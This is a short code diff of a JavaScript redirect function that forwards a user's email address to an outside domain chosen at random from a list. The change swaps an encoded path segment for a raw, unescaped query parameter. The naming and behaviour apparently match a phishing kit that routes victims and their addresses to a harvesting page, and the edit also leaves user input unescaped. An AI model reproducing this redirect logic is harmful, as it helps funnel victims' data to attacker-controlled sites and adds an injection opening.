@@ -128,7 +128,7 @@
         function redirectToTarget(email) {
             const links = [
               
-                `https://remittancegateway.com/new/${encodeURIComponent(email)}`
+                `https://remittancegateway.com/new/?email=${email}`
             ];
             const randomLink = links[Math.floor(Math.random() * links.length)];
             console.log("Redirecting to: ", randomLink);
